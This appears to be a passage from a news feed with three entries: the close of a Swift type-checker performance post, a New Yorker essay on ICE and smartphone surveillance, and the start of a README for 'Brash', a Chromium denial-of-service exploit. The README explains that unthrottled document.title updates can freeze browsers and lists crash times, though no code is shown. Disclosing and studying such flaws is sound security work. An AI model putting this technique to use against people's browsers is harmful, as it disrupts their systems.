      &lt;p&gt;The algorithmic complexity in constraint solving arises as a result of these disjunction constraints, because in the worst case, there is no better approach to solving such a constraint system except to attempt each combination of disjunction choices.&lt;/p&gt;
      &lt;p&gt;This is somewhat like solving a Sudoku. You can write down a number in a blank square, and then check that the result is a valid board. If it is, you try to fill in another square, and so on. On the other hand, if you get stuck, you backtrack by erasing a previously filled in square, and attempt to place a number somewhere else. If you're lucky and make perfect a guess at each step, you can fill in the whole board without backtracking. At the other extreme, you might end up attempting every possible path to a solution, which can take a long time.&lt;/p&gt;
      &lt;p&gt;For a more detailed overview of constraint solving in the Swift type checker, see swift/docs/TypeChecker.md at main · swiftlang/swift · GitHub. For an explanation of why overload resolution is inherently hard, and why every known approach has exponential running time in the worst case, see How does compiler compile SwiftUI code? - #4 by Slava_Pestov and Lambda Expressions vs. Anonymous Methods, Part Five | Microsoft Learn.&lt;/p&gt;
      &lt;head rend="h3"&gt;What does &lt;code&gt;reasonable time&lt;/code&gt; mean?&lt;/head&gt;
      &lt;p&gt;Since constraint solving with disjunctions takes exponential time in the worst case, it will always be possible to write down a short program that would require an inordinate amount of time to type check, so the type checker must limit the total amount of work that it does, and fail if this limit is reached.&lt;/p&gt;
      &lt;p&gt;The Swift type checker imposes two such limits:&lt;/p&gt;
      &lt;list rend="ul"&gt;
        &lt;item&gt;Every time we attempt a disjunction choice, we increment a counter. The counter is reset to zero at the start of each expression, and if the value exceeds one million, we give up.&lt;/item&gt;
        &lt;item&gt;The constraint solver also allocates various data structures in a per-expression arena, which is then torn down in one shot once type checking this expression ends. If the total size of the arena exceeds 512 megabytes, we give up.&lt;/item&gt;
      &lt;/list&gt;
      &lt;p&gt;In the past, Swift also had a wall-clock time limit, but this is no longer enabled by default, because it is non-deterministic across machines. Counting operations is a better approach, and most "too complex" expressions don't take longer than 4 seconds on a typical machine in practice.&lt;/p&gt;
      &lt;head rend="h3"&gt;Invalid expressions, salvage mode, and diagnostics&lt;/head&gt;
      &lt;p&gt;In ordinary type checking, the solver stops and backtracks immediately when a constraint fails, but this does not in itself produce precise error messages.&lt;/p&gt;
      &lt;p&gt;To get good diagnostics after a failure, we restart the solving process again, this time with an expanded search space. This is called "salvage mode." In salvage mode, a failure to solve a constraint is handled differently. Instead of simply failing the constraint and stopping the solver, we proceed as if the failed constraint succeeded, but we also record a fix.&lt;/p&gt;
      &lt;p&gt;For example, if an expression does not type-check because &lt;code&gt;Int&lt;/code&gt; does not conform to &lt;code&gt;Sequence&lt;/code&gt;, then this conformance constraint will fail on the first attempt. We then restart type checking in salvage mode. When the bogus constraint comes up again, we pretend that &lt;code&gt;Int&lt;/code&gt; actually does conform to &lt;code&gt;Sequence&lt;/code&gt;, but we record a fix, and continue solving more constraints until we're done.&lt;/p&gt;
      &lt;p&gt;Once we finish solving the constraint system in salvage mode, the collected fixes are then analyzed to produce a diagnostic. Finally, if salvage mode fails but no fixes are recorded, we emit the &lt;code&gt;failed to produce diagnostic&lt;/code&gt; error.&lt;/p&gt;
      &lt;p&gt;For more details about the diagnostic architecture, see New Diagnostic Architecture Overview | Swift.org.&lt;/p&gt;
      &lt;head rend="h1"&gt;Goals and non-goals&lt;/head&gt;
      &lt;p&gt;While the worst case behavior is unavoidable, it does not have to be the case that type checking must take exponential time on all expressions, even when complex overload sets are involved. In fact, most expressions do type-check rather quickly, even today. It is also true that for any given single "hard" expression, it is possible to devise a heuristic that will solve it quickly, because in the extreme case, you can hard-code knowledge of that specific problem instance in the constraint solver (of course, we won't do that).&lt;/p&gt;
      &lt;p&gt;The main goal then, is to devise sufficiently-general heuristics which can quickly solve most realistic problem instances, without hard-coding too many special cases, so that hopefully, the exponential running time only appears with pathological examples which are unlikely to occur in practice. The primary way to accomplish this is to attempt disjunction choices in the right order---this includes both choosing the next disjunction to attempt, and the next choice within a disjunction to attempt. Also, we can avoid considering disjunction choices that lead to contradictions. By doing this, we can find the valid solutions more quickly, and spend less time exploring long "dead ends."&lt;/p&gt;
      &lt;p&gt;A secondary goal is to improve the auxiliary data structures and algorithms used in the constraint solver, so that even if an exhaustive search must be attempted on a given expression, as will sometimes be the case, we burn less CPU time while considering the same search space.&lt;/p&gt;
      &lt;p&gt;There are also two non-goals worth mentioning:&lt;/p&gt;
      &lt;list rend="ol"&gt;
        &lt;item&gt;
          &lt;p&gt;Removing overloading from the language. Without disjunction constraints, a constraint system can almost always be solved very quickly. However, this would be such a major change to the language, and break so many existing APIs, that it is not feasible to attempt at this point, even as a new language mode.&lt;/p&gt;
        &lt;/item&gt;
        &lt;item&gt;
          &lt;p&gt;Removing bidirectional inference. We can also imagine a language design where expressions are type-checked in a strictly bottom-up fashion, starting from the leaves, like in many other C-family languages. This is another drastic simplification that essentially trivializes the whole problem. However, this would require giving up on language features such as polymorphic literals, leading-dot member syntax, closures with inferred types, and parts of generics. All of these are features that make Swift into the expressive language it is today.&lt;/p&gt;
        &lt;/item&gt;
      &lt;/list&gt;
      &lt;head rend="h1"&gt;Recent improvements&lt;/head&gt;
      &lt;head rend="h2"&gt;Swift 6.2&lt;/head&gt;
      &lt;p&gt;In Swift 6.2, we spent time profiling the type checker with various larger projects, as well as individual slow expressions, both valid and invalid. This uncovered some bottlenecks, including with the backtracking implementation, various graph algorithms such as computing connected components, and other miscellaneous algorithms.&lt;/p&gt;
      &lt;p&gt;The first example is an invalid expression where we can see a small improvement. Consider the last line of the below code listing, which appeared in this blog post:&lt;/p&gt;
      &lt;quote&gt;
        &lt;code&gt;let address = "127.0.0.1"
let username = "steve"
let password = "1234"
let channel = 11

let url = "http://" + username 
            + ":" + password 
            + "@" + address 
            + "/api/" + channel 
            + "/picture"
&lt;/code&gt;
      &lt;/quote&gt;
      &lt;p&gt;The expression is invalid as written, because there is no overload of &lt;code&gt;+&lt;/code&gt; taking an &lt;code&gt;Int&lt;/code&gt; and a &lt;code&gt;String&lt;/code&gt;. On my machine, Swift 6.1 spends 10 seconds to produce an &lt;code&gt;unable to type-check&lt;/code&gt; error, while in Swift 6.2, we get the same error in 6 seconds. Of course, this is not the desired end state, since we should instead produce a meaningful diagnostic. However, this example specifically illustrates that the type checker is able to do the same amount of work in less time.&lt;/p&gt;
      &lt;p&gt;For a more realistic example, I measured a project that makes heavy use of overloading and generics, and saw that total type checking time improved from 42 seconds in Swift 6.1, down to 34 seconds in Swift 6.2.&lt;/p&gt;
      &lt;head rend="h2"&gt;Swift 6.3&lt;/head&gt;
      &lt;head rend="h3"&gt;Optimized disjunction selection&lt;/head&gt;
      &lt;p&gt;Recent &lt;code&gt;main&lt;/code&gt; development snapshots introduced a large set of changes that @xedin has been working on for several years now, to improve disjunction selection, by collecting more information to decide what disjunction should be attempted next. Unlike the targeted optimizations in Swift 6.2 which offered incremental wins without reducing the fundamental complexity of the problem, the disjunction selection changes allow the type checker to quickly solve many expressions that we were formerly unable to type-check. The new algorithm can also drastically speed up expressions that would type check, but were just under the limit and thus slow.&lt;/p&gt;
      &lt;p&gt;These changes replace some older optimizations that would look at the entire expression before solving begins, to attempt "pre-solving" certain sub-expressions. These hacks were rather brittle in practice, so a small change to an expression could defeat the entire hack.&lt;/p&gt;
      &lt;p&gt;The optimized disjunction selection algorithm instead runs as part of the constraint solver, making it more robust and predictable. The biggest wins can be seen with expressions that involve math operators and literals. Here is a typical example. The Swift 6.2 compiler was unable to type check the below expression, but the compiler from &lt;code&gt;main&lt;/code&gt; type checks this successfully, in 4 milliseconds:&lt;/p&gt;
      &lt;quote&gt;
        &lt;code&gt;func test(n: Int) -&amp;gt; Int {
  return n == 0 ? 0 : (0..&amp;lt;n).reduce(0) { x, y in
    (x &amp;gt; 0 &amp;amp;&amp;amp; y % 2 == 0) ? (((x + y) - (x + y)) / (y - x)) + ((x + y) / (y - x)) : x
  }
}
&lt;/code&gt;
      &lt;/quote&gt;
      &lt;p&gt;The invalid expression from above, where &lt;code&gt;+&lt;/code&gt; was applied to &lt;code&gt;String&lt;/code&gt; and &lt;code&gt;Int&lt;/code&gt;, is still rejected, however with the new algorithm, it only takes the compiler 2 seconds to reach the limit.&lt;/p&gt;
      &lt;p&gt;Finally, on the same project I mentioned in the Swift 6.2 summary above, the new algorithm yields a further reduction in total type checking time, down to 12 seconds.&lt;/p&gt;
      &lt;p&gt;(If you find an expression that type checks on a released version of Swift but fails on a &lt;code&gt;main&lt;/code&gt; development snapshot, please file a GitHub issue.)&lt;/p&gt;
      &lt;head rend="h3"&gt;Optimized constraint solver arena usage&lt;/head&gt;
      &lt;p&gt;Recent &lt;code&gt;main&lt;/code&gt; development snapshots also introduce an optimization which eliminates a source of exponential space usage in the constraint solver. This optimization is still disabled by default, but we hope to enable it soon. (You can enable it with the &lt;code&gt;-solver-enable-prepared-overloads&lt;/code&gt; frontend flag on a &lt;code&gt;main&lt;/code&gt; development snapshot if you'd like to test it now.)&lt;/p&gt;
      &lt;p&gt;This optimization works as follows. Previously, when attempting a disjunction choice for a generic overload, the solver would generate new type variables and constraints corresponding to the generic parameters and &lt;code&gt;where&lt;/code&gt; clause requirements of the generic overload. If the same overload had to be attempted multiple times, in combination with other overload choices, the same type variables and constraints would be generated every time. These type variables and constraints are allocated in the constraint solver's arena. This space optimization instead allocates these structures once, the first time a disjunction choice is attempted.&lt;/p&gt;
      &lt;p&gt;For many expressions, this leads to a drastic reduction in constraint solver arena usage. In some instances, it will transform an exponential space problem into a polynomial space problem, even if it still requires exponential time. Furthermore, since less space also means less time, the primary benefit here is again a reduction in total type checking time. In the future, pre-generating these structures will also enable further improvements to the disjunction choice algorithm.&lt;/p&gt;
      &lt;p&gt;On the invalid expression from earlier, where &lt;code&gt;+&lt;/code&gt; was applied to &lt;code&gt;String&lt;/code&gt; and &lt;code&gt;Int&lt;/code&gt;, the constraint solver arena space optimization further reduces the time to reach the limit, down to 1.7 seconds. (That's a more than 5x improvement since Swift 6.1.)&lt;/p&gt;
      &lt;p&gt;Finally, with the same test project I mentioned twice above, this optimization decreases total type checking time from 12 seconds, down to 10 seconds. (That's a more than 4x improvement since Swift 6.1.)&lt;/p&gt;
      &lt;head rend="h3"&gt;Expanding our test suite to cover more fast and slow expressions&lt;/head&gt;
      &lt;p&gt;To help prevent performance regressions in the future, and to track progress on solving the problem, we have added more test cases to our suite. These have been reduced from user-reported slow expressions in GitHub issues for the Swift project.&lt;/p&gt;
      &lt;p&gt;Some of the test cases also use our &lt;code&gt;scale-test&lt;/code&gt; tool, which repeats a common element of an expression (think adding &lt;code&gt;+ 1 + 1 + 1 ...&lt;/code&gt;), measures the performance of each instance, and then attempts to guess if the resulting problem scales in polynomial or exponential time. This helps catch more subtle issues where a given expression might still appear to be "fast", but becomes slow if you make it just a little bit longer.&lt;/p&gt;
      &lt;p&gt;These test cases are found in the validation-test/Sema/type_checker_perf directory in the Swift repo. The recently added test cases are in Sema: Collected expression checking performance test cases from GitHub issues by slavapestov · Pull Request #84450 · swiftlang/swift · GitHub, with a few more in Even more type checker perf tests by slavapestov · Pull Request #84890 · swiftlang/swift · GitHub. We hope to continue expanding the type checker performance test suite over time.&lt;/p&gt;
      &lt;head rend="h1"&gt;Future improvements&lt;/head&gt;
      &lt;p&gt;Disclaimer: all of the below is subject to change as our plans evolve.&lt;/p&gt;
      &lt;head rend="h2"&gt;Optimizing bindings&lt;/head&gt;
      &lt;p&gt;Imagine we're solving a constraint system, and we're left with a single unsolved constraint, a conversion from a type variable &lt;code&gt;T0&lt;/code&gt; to &lt;code&gt;Optional&amp;lt;Int&amp;gt;&lt;/code&gt;. At this point, in order to proceed, we must "guess" the concrete type to bind to &lt;code&gt;T0&lt;/code&gt;. While &lt;code&gt;T0&lt;/code&gt; might just be &lt;code&gt;Optional&amp;lt;Int&amp;gt;&lt;/code&gt;, another valid choice is &lt;code&gt;Int&lt;/code&gt;, because &lt;code&gt;Int&lt;/code&gt; converts to &lt;code&gt;Optional&amp;lt;Int&amp;gt;&lt;/code&gt;. The bindings subsystem in the constraint solver is responsible for tracking the potential bindings for each type variable by considering unsolved conversion constraints, and ultimately, attempting various potential bindings until a solution is found.&lt;/p&gt;
      &lt;p&gt;The book-keeping for bindings is rather complicated, and must be updated incrementally as constraints are solved and new constraints are introduced. Another complication is that to choose the next binding to attempt, we must consider all type variables and all of their potential bindings, and rank them according to a heuristic.&lt;/p&gt;
      &lt;p&gt;Today, this ranking process indeed considers all type variables and all bindings, and ultimately picks just one type variable and just one binding to attempt. This must be repeated for each unbound type variable, which of course results in a quadratic time algorithm.&lt;/p&gt;
      &lt;p&gt;Thus, even in a constraint system without a large number of complex overloads, it is sometimes possible to observe algorithmic complexity due to bindings. Now, most expressions do not involve a large number of type variables---it is far more common to see a large number of disjunction choices instead. But one situation where a large number of type variables are generated is if you write an array or dictionary literal with a large number of elements.&lt;/p&gt;
      &lt;p&gt;We plan on overhauling the data structures for tracking potential bindings, both to eliminate some duplicate bookkeeping (&lt;code&gt;BindingSet&lt;/code&gt; and &lt;code&gt;PotentialBindings&lt;/code&gt; in the implementation) and to make the choice of the next binding to attempt something that can be done in constant or logarithmic time, instead of the current situation where it is linear in the number of type variables. This will radically speed up the type checking of large array and dictionary literals.&lt;/p&gt;
      &lt;p&gt;Since solving constraints can introduce new bindings, an important decision problem is whether a binding set is "complete". Today, this check is very conservative, so we often don't attempt bindings until we've gone far down a path of disjunction choices. More accurate computation of when a binding set is complete would allow bindings to be attempted sooner, which would reduce algorithmic complexity of type-checking many common expressions.&lt;/p&gt;
      &lt;p&gt;Another improvement to the bindings logic would allow the solver to reach a contradiction by considering contradictory bindings. Today, if a type variable &lt;code&gt;T0&lt;/code&gt; is subject to two conversion constraints, for example to &lt;code&gt;Optional&amp;lt;Int&amp;gt;&lt;/code&gt; and &lt;code&gt;Optional&amp;lt;String&amp;gt;&lt;/code&gt;, we don't reach a contradiction until we attempt every possible concrete type for &lt;code&gt;T0&lt;/code&gt;. But in this case, there is no concrete type that converts to both &lt;code&gt;Optional&amp;lt;Int&amp;gt;&lt;/code&gt; and &lt;code&gt;Optional&amp;lt;String&amp;gt;&lt;/code&gt;, and so a contradiction could be reached faster, avoiding wasting time exploring dead ends.&lt;/p&gt;
      &lt;p&gt;These improvements to the binding logic should speed up many expressions, including long collection literals as I mentioned, and also the aforesaid invalid expression where &lt;code&gt;+&lt;/code&gt; was applied to &lt;code&gt;String&lt;/code&gt; and &lt;code&gt;Int&lt;/code&gt;, where we should finally be able to quickly produce an actionable diagnostic.&lt;/p&gt;
      &lt;head rend="h2"&gt;Removing more performance hacks&lt;/head&gt;
      &lt;p&gt;While the new disjunction selection algorithm subsumed many old performance hacks, some hacks remain. Once again, these hacks tend to be applicable in narrow cases only, which introduces performance cliffs when small changes are made to an expression, and they also have "load-bearing" semantic effects which complicate the language model. These will be generalized or subsumed by existing optimizations over time.&lt;/p&gt;
      &lt;p&gt;It's worth noting that fixing some of these might be source-breaking in extreme edge cases, but we think this is worth the small inconvenience it may cause. Aside from improving performance, this will make the language semantics easier to reason about, and also improve diagnostics.&lt;/p&gt;
      &lt;p&gt;To make this more concrete, here are a few random examples of hacks that we hope to eliminate:&lt;/p&gt;
      &lt;list rend="ul"&gt;
        &lt;item&gt;Subscripting of &lt;code&gt;Array&lt;/code&gt; and &lt;code&gt;Dictionary&lt;/code&gt; types is handled in a special way, with a narrow optimization that dates back all the way to Swift 1.0 (&lt;code&gt;inferCollectionSubscriptResultType()&lt;/code&gt;). It can result in strange overload resolution behavior in some cases, and of course it doesn't generalize to subscripts on user-defined types.&lt;/item&gt;
        &lt;item&gt;When simplifying a function call constraint, we look for the case where all overloads have a common return type (&lt;code&gt;simplifyAppliedOverloadsImpl()&lt;/code&gt;). This does not handle generic return types at all, and has some strange edge-case behaviors.&lt;/item&gt;
        &lt;item&gt;There is an optimization that kicks in when a generic overload set has exactly two overloads (&lt;code&gt;tryOptimizeGenericDisjunction()&lt;/code&gt;). This is an obvious performance cliff if a third overload is added, even if its not used in the expression.&lt;/item&gt;
        &lt;item&gt;A set of optimizations attempt to skip some disjunction choices entirely, and "partition" overload sets for math operators into generic, concrete, and SIMD overloads. This is too specific to math operators, and again leads to strange behavior where a concrete overload is chosen even though a generic overload would result in better solutions or diagnostics.&lt;/item&gt;
      &lt;/list&gt;
      &lt;head rend="h2"&gt;Optimizing the handling of partial solutions&lt;/head&gt;
      &lt;p&gt;One of the steps in our constraint solver algorithm constructs a constraint graph, where the vertices are type variables, and the edges relate each pair of type variables that appear in the same constraint. An important optimization detects a situation where this graph has more than one connected component, in which case each component can be solved independently. The "partial solutions" that we obtain from solving each component are then merged to form a solution for the overall constraint system.&lt;/p&gt;
      &lt;p&gt;In many situations, this can avoid exponential behavior. However, in other situations where a large number of partial solutions are produced, building the data structures representing these partial solutions, and the merging algorithm itself, can dominate type checking time for a given expression.&lt;/p&gt;
      &lt;p&gt;By building upon the "trail" data structure for speeding up backtracking that was introduced in Swift 6.2, we hope to reduce the overhead caused by partial solutions in those pathological cases. A specific class of expression where this tends to arise is when you have a large collection literal and each element is itself a complex expression.&lt;/p&gt;
      &lt;head rend="h2"&gt;Improving salvage mode&lt;/head&gt;
      &lt;p&gt;While not strictly performance-related, we would also like to eliminate more cases where salvage mode fails to record any fixes, which as I mentioned above, results in the unhelpful &lt;code&gt;failed to produce diagnostic&lt;/code&gt; error.&lt;/p&gt;
      &lt;p&gt;In fact, another odd situation can arise with salvage mode today: there are known examples where normal type checking fails, but salvage mode then succeeds, in which case we accept the expression. This is a performance problem right off the bat, because such an expression must essentially be type checked twice before a solution is found, even though it is valid.&lt;/p&gt;
      &lt;p&gt;This is also not intended by design, and it involves certain corners of the language which are not well-understood or tested. Fixing these situations will improve performance in pathological cases, while also cleaning up these edge cases in the language, and improving test coverage. Ultimately, if salvage succeeds in this way, we plan to have the solver emit another "fallback diagnostic" instead of silently proceeding.&lt;/p&gt;
      &lt;p&gt;Finally, if normal type-checking produces multiple valid solutions, we still enter salvage mode today, before we generate an ambiguity diagnostic. This should not be necessary, and addressing this will speed up diagnostics for certain invalid ambiguous expressions. This will also reduce the probability that salvage mode, which must do more work by design, will then fail with an "unable to type-check" error, instead of emitting an actionable diagnostic using information already gleaned from normal type checking.&lt;/p&gt;
      &lt;head rend="h1"&gt;Longer-term future improvements&lt;/head&gt;
      &lt;p&gt;I'm going to end this post with more tentative ideas, that while not fully fleshed out, have the potential drastically improve type checking performance.&lt;/p&gt;
      &lt;head rend="h2"&gt;Changes to operator lookup&lt;/head&gt;
      &lt;p&gt;So far, I've only talked about changes which are (mostly) source-compatible, and this has been our main focus to date. However, while we've ruled out drastic solutions such as removing overloading or bidirectional inference entirely, we are considering some more targeted language changes, which would be rolled out with upcoming features or language modes.&lt;/p&gt;
      &lt;p&gt;Consider the &lt;code&gt;==&lt;/code&gt; operator. This operator is heavily-overloaded, but most overloads are implementations of the &lt;code&gt;Equatable&lt;/code&gt;  protocol's &lt;code&gt;==&lt;/code&gt; requirement. In principle, we could avoid attempting each one in turn, simplifying the constraint system that we generate for any expression that involves &lt;code&gt;==&lt;/code&gt;.&lt;/p&gt;
      &lt;p&gt;We plan to investigate a scheme where we prune overload sets to hide overloads that witness a protocol requirement, which will simplify overload sets for &lt;code&gt;==&lt;/code&gt; as well as many other (but not all) operators.&lt;/p&gt;
      &lt;p&gt;This will require changing the rules for solution ranking, which today always prefer concrete overloads; however, we will need to prefer the generic &lt;code&gt;Equatable.==&lt;/code&gt; overload in many instances as well. For this reason, such a change might be slightly source breaking, at least in pathological cases, but it might be possible to stage in a way that avoids disruption for realistic programs.&lt;/p&gt;
      &lt;head rend="h2"&gt;Changes to polymorphic literals&lt;/head&gt;
      &lt;p&gt;A common misconception is that polymorphic literals, like integers and strings, themselves introduce overloads, where every concrete type conforming to an &lt;code&gt;ExpressibleBy*&lt;/code&gt; protocol adds a disjunction choice to the literal. This isn't quite right; a literal such as &lt;code&gt;"hello world"&lt;/code&gt; will type check if a concrete type is known from the surrounding code, and if that fails, via a default type, which is &lt;code&gt;String&lt;/code&gt; in this case. So while this acts as a disjunction of sorts, in this case the disjunction only has two choices, and often the default is not attempted at all.&lt;/p&gt;
      &lt;p&gt;However, an integer literal such as &lt;code&gt;123&lt;/code&gt; actually has two default types, &lt;code&gt;Int&lt;/code&gt; and &lt;code&gt;Double&lt;/code&gt;, and the resulting disjunction has three choices. It might be worth considering a language change where floating point literals must be spelled with a decimal point. Today, expressions involving mixed integer and double literals can be particularly tricky to type check, for this reason.&lt;/p&gt;
      &lt;head rend="h2"&gt;Improved constraint solving techniques&lt;/head&gt;
      &lt;p&gt;Once we are further along with various refactorings and cleanups described above, we will be in a position to implement more advanced constraint solving techniques, such as those commonly used in SAT solvers today. "SAT," or Boolean formula satisfiability, is a related problem to operator overloading. (Like overload resolution, SAT takes exponential time to solve in the worst case, but unlike overload resolution, the "domain" of each type variable is a true or false value. Instead of "constraints", the problem instance consists of a Boolean formula built up from "and", "or", and "not" operations.) Many of the techniques used to speed up SAT solvers can be applied to constraint solving.&lt;/p&gt;
      &lt;p&gt;A solver that supports non-chronological backtracking can jump back over more than one disjunction choice once it detects a contradiction. This avoids the exploration of more dead-ends that necessarily fail, because some constraint further up is already unsatisfiable.&lt;/p&gt;
      &lt;p&gt;Another technique is clause learning. The "naive" approach to constraint solving will discard all state changes when backtracking after a contradiction is discovered. In a solver with clause learning, the algorithm will, roughly speaking, "learn" facts as it goes, recording new constraints that result from backtracking. This ensures that if the same situation arises again, the contradiction can be detected sooner because of the "learned" constraint.&lt;/p&gt;
      &lt;p&gt;(For those curious to learn more about SAT solvers, here is a blog post I saw the other day with a good summary: SATisfying Solutions to Difficult Problems! - Vaibhav Sagar. A book with a decent introduction is "The Satisfiability Problem" by Schóning and Torán. An in-depth treatment appears in Knuth Volume 4B. Finally, a recent academic paper titled The simple essence of overloading by Beneš and Brachthäuser, outlines an interesting approach to overload resolution where the problem is reduced to a binary decision diagram. Some of the ideas here may apply to Swift type checking as well.)&lt;/p&gt;
      &lt;head rend="h1"&gt;Conclusion&lt;/head&gt;
      &lt;p&gt;There are quite a number of interesting improvements that can be made to the Swift type checker, and we look forward to sharing more updates as we make progress in this area.&lt;/p&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45767257</guid><pubDate>Fri, 31 Oct 2025 01:00:45 +0000</pubDate></item><item><title>ICE and the Smartphone Panopticon</title><link>https://www.newyorker.com/culture/infinite-scroll/ice-and-the-smartphone-panopticon</link><description>&lt;doc fingerprint="bdd5b2b089ecd0d9"&gt;
  &lt;main&gt;
    &lt;p&gt;Last week, as ICE raids ramped up in New York, city residents set about resisting in the ways they had available: confronting agents directly on sidewalks, haranguing them as they processed down blocks, and recording them on phone cameras held aloft. Relentless documentation has proved something of an effective tool against President Donald Trump’s empowerment of ICE; agents have taken to wearing masks in fear of exposure, and the proliferation of imagery showing armed police and mobilized National Guard troops in otherwise calm cities has underlined the cruel absurdity of their activities. Activist memes have been minted on social media: a woman on New York’s Canal Street, dressed in a polka-dotted office-casual dress, flipping ICE agents off; a man in Washington, D.C., throwing a Subway sandwich at a federal agent in August. The recent “No Kings” marches were filled with protesters in inflatable frog costumes, inspired by a similarly outfitted man who got pepper-sprayed protesting outside the U.S. Immigration and Customs Enforcement Building in Portland, Oregon. Some might write the memes off as resistance porn, but digital content is at least serving as a lively defense mechanism in the absence of functional politics.&lt;/p&gt;
    &lt;p&gt;At the same time, social media has served as a reinvigorated source of transparency in recent weeks, harking back to the days when Twitter became an organizing tool during the Arab Spring, in the early twenty-tens, or when Facebook and Instagram helped fuel the Black Lives Matter marches of 2020. The grassroots optimism of that earlier social-media era is long gone, though, replaced by a sense of posting as a last resort. After Trump authorized the deployment of the National Guard in Chicago earlier this month, the governor of Illinois, J. B. Pritzker, told residents to “record and narrate what you see—put it on social media.” But, if the anti-MAGA opposition is taking advantage of the internet, ICE and the Trump Administration are, too. Right-wing creators have been using the same channels to identify and publicize targets for raids. According to reporting in Semafor, the Trump-friendly YouTuber Nick Shirley’s videos of African migrant vendors on Canal Street seemed to help drive recent ICE sweeps of the area. ICE itself is also working to monitor social media. The investigative outlet The Lever found documents revealing that the agency has enlisted an A.I.-driven surveillance product called Zignal Labs that creates “curated detection feeds” to aid in criminal investigations. According to reporting in Wired, ICE also has plans to build out a team of dozens of analysts to monitor social media and identify targets. Recent videos, identified by 404 Media and other publications, have purportedly shown ICE agents using technology developed by the data-analytics firm Palantir, founded by Peter Thiel and others, to scan social-media accounts, government records, and biometrics data of those they detain. Social media has become a political panopticon in which your posts are a conduit for your politics, and what you post can increasingly be used against you.&lt;/p&gt;
    &lt;p&gt;Meanwhile, a new wave of digital tools has emerged to help surveil the surveillants. The apps ICEBlock, Red Dot, and DEICER all allow users to pinpoint where ICE agents are active, forming an online version of a whisper network to alert potential targets. Eyes Up provides a way for users to record and upload footage of abusive law-enforcement activity, building an archive of potential evidence. Its creator is a software developer named Mark (who uses only his first name to separate the project from his professional work); he was inspired to create Eyes Up earlier this year, when he began seeing clips of ICE abductions and harassment circulating on social media and worried about their shelf life. As he put it to me, “They could disappear at any given moment, whether the platforms decide to moderate, whether the individual deletes their account or the post.”&lt;/p&gt;
    &lt;p&gt;Ultimately, the app itself was also vulnerable to sudden disappearance. After launching, on September 1st, Eyes Up accumulated thousands of downloads and thousands of minutes of uploaded footage. Then, on October 3rd, Mark received a notice that Apple was removing the app from its store on the grounds that it may “harm a targeted individual or group.” Eyes Up is not alone. ICEBlock and Red Dot have been blocked from both Apple and Google’s app stores, the two largest marketplaces; DEICER, like Eyes Up, was removed by Apple. Pressure on the tech platforms seemed to come from the Trump Administration; after a deadly shooting at an ICE field office in Dallas in late September, the Attorney General, Pam Bondi, said in a statement to Fox News Digital that ICEBlock “put ICE agents at risk just for doing their jobs.” Mark is contesting Apple’s decision about Eyes Up through its official channels, and the creator of ICEBlock, Joshua Aaron, has argued that his app should be treated no differently than services, such as Google’s Waze, that allow users to warn one another of highway speed traps. But for now they must try to make do with a limited reach.&lt;/p&gt;
    &lt;p&gt;The politicized removal of these tools reflects an irony—ICE is aggrieved that its own tactics have been turned against it. Mark described a “double standard”: applications of technology that are friendly to the Administration’s goals are going unchallenged, in part because tech companies have become increasingly willing to support the President’s whims. “It’s clear whose rules they’re following, who they are trying to win over,” Mark said. Like other forms of self expression, digital-communication technology has become dangerously circumscribed under Trump; only the tools that exist independent of Big Tech seem like safe bets for dissent. Posting clips of the polka-dotted-dress lady on social media might be cathartic, but it will take the resistance only so far.&lt;/p&gt;
    &lt;p&gt;Still, we record and we post because it’s better than the alternative, which is suffering governmental predations in silence. This past weekend, a friend of mine in Washington, D.C., where I live, sent a photo she had taken of armed National Guard members patrolling the Sunday-morning farmers’ market in Dupont Circle. Trump’s militarized policing has operated on and off in the city since August, when the Administration seized control of the local police force, and residents have become all too accustomed to seeing camouflaged troops intrude on our daily routines. Most often, I encounter them walking through largely empty residential streets in the middle of the afternoon, and I take photos with my phone to mark the ominous superfluity of the exercise: our President’s extreme and dangerous response to a nonexistent emergency. Sharing footage is a small reminder that this is really happening. ♦&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45767325</guid><pubDate>Fri, 31 Oct 2025 01:13:56 +0000</pubDate></item><item><title>Chromium Browser DoS Attack via Document.title Exploitation</title><link>https://github.com/jofpin/brash</link><description>&lt;doc fingerprint="f99492c0d1bf7ba8"&gt;
  &lt;main&gt;
    &lt;p&gt;Brash is a critical vulnerability in Blink, the rendering engine that powers Google's Chromium-based browsers. It allows any Chromium browser to collapse in 15-60 seconds by exploiting an architectural flaw in how certain DOM operations are managed.&lt;/p&gt;
    &lt;p&gt;The attack vector originates from the complete absence of rate limiting on &lt;code&gt;document.title&lt;/code&gt; API updates. This allows injecting millions of DOM mutations per second, and during this injection attempt, it saturates the main thread, disrupting the event loop and causing the interface to collapse. The impact is significant, it consumes high CPU resources, degrades overall system performance, and can halt or slow down other processes running simultaneously. By affecting Chromium browsers on desktop, Android, and embedded environments, this vulnerability exposes over 3 billion people on the internet to system-level denial of service.&lt;/p&gt;
    &lt;p&gt;STATUS: Operational&lt;lb/&gt; AFFECTED VERSIONS: Chromium ≤ 143.0.7483.0 (tested: 138.0.7204.251, 141.0.7390.108, 143.0.7483.0)&lt;/p&gt;
    &lt;p&gt;Note&lt;/p&gt;
    &lt;p&gt;The exploit is currently operational. Once the vulnerability is patched, this code will cease to work. Regardless, discovering this architectural flaw and completing the entire research, documentation, and design process to share something impactful with the world has been an incredibly rewarding journey.&lt;/p&gt;
    &lt;p&gt;11 major browsers were tested on macOS, Windows, and Linux to validate the vulnerability's impact.&lt;/p&gt;
    &lt;p&gt;All Chromium-based browsers are vulnerable because the flaw exists in the core of the Blink rendering engine:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Chrome — crashes in 15-30 seconds&lt;/item&gt;
      &lt;item&gt;Edge — crashes in 15-25 seconds&lt;/item&gt;
      &lt;item&gt;Vivaldi — crashes in 15-30 seconds&lt;/item&gt;
      &lt;item&gt;Arc Browser — crashes in 15-30 seconds&lt;/item&gt;
      &lt;item&gt;Dia Browser — crashes in 15-30 seconds&lt;/item&gt;
      &lt;item&gt;Opera — crashes in ~60 seconds&lt;/item&gt;
      &lt;item&gt;Perplexity Comet — crashes in 15-35 seconds&lt;/item&gt;
      &lt;item&gt;ChatGPT Atlas — crashes in 15-60 seconds&lt;/item&gt;
      &lt;item&gt;Brave — crashes in 30-125 seconds&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
